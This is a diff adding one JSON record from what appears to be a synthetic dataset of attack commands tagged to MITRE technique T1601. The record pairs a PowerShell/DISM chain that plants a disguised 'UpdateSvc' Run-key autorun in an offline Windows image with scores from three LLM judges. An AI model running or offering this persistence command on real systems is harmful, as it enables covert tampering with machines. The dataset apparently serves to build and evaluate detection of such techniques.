@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; reg load HKLM\\BASESOFT C:\\Mount\\Base\\Windows\\System32\\Config\\SOFTWARE >$null; reg load HKLM\\OFFSOFT C:\\Mount\\Win\\Windows\\System32\\Config\\SOFTWARE >$null; New-Item -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -Force | Out-Null; New-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"UpdateSvc\" -Value \"C:\\Windows\\System32\\updater.ps1\" -PropertyType String -Force | Out-Null; $b=(Get-ItemProperty \"Registry::HKEY_LOCAL_MACHINE\\BASESOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split(\"`n\"); $m=(Get-ItemProperty \"Registry::HKEY_LOCAL_MACHINE\\OFFSOFT\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split(\"`n\"); Compare-Object $b $m",
+  "explanation": "Modifies the offline image's Run key to establish startup execution and compares the registry values against a clean baseline using Compare-Object.",
+  "rationale_steps": [
+    "Mount images and load offline SOFTWARE hives (Admin-only).",
+    "Create a new Run entry in the modified image.",
+    "Extract values from both hives and Compare-Object to confirm the added autorun."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-05eb1a53",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid DISM parameters, correct registry manipulation commands, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by mounting and modifying a Windows system image to add a persistence mechanism through the Run registry key, then comparing it against a clean baseline to verify the changes.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:15:21.658061Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct syntax for DISM, REG, and PowerShell cmdlets, with balanced quotes, valid flags, and proper command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's actions perfectly align with T1601 (modifying an offline system image for persistence), it is operationally unfeasible as described because all core operations (dism /Mount-Image, reg load, New-Item/New-ItemProperty for HKLM) critically require Administrator privileges, not 'None' as stated.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:15:46.869613Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed PowerShell chain with balanced quotes and valid flags; minor issue is the dubious use of '>$null' redirection which may cause runtime errors though it parses.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with modifying an offline Windows image by adding a Run key, but requires admin privileges (not 'None') and omits reg unload and DISM unmount/commit steps, so changes may not persist.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T17:16:57.211616Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
